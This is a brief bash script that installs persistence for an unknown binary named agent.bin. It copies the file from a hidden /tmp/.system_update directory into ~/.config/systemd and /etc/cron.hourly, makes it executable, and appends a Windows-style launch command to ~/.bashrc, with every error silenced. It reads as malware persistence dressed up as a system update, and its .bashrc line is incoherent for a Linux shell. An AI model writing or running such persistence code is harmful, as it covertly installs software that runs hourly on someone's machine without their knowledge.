#!/bin/bash
cp /tmp/.system_update/agent.bin ~/.config/systemd/ 2>/dev/null
cp /tmp/.system_update/agent.bin /etc/cron.hourly/ 2>/dev/null
chmod +x /etc/cron.hourly/agent.bin 2>/dev/null
echo 'start /B C:\\Users\\Public\\agent.exe' >> ~/.bashrc 2>/dev/null
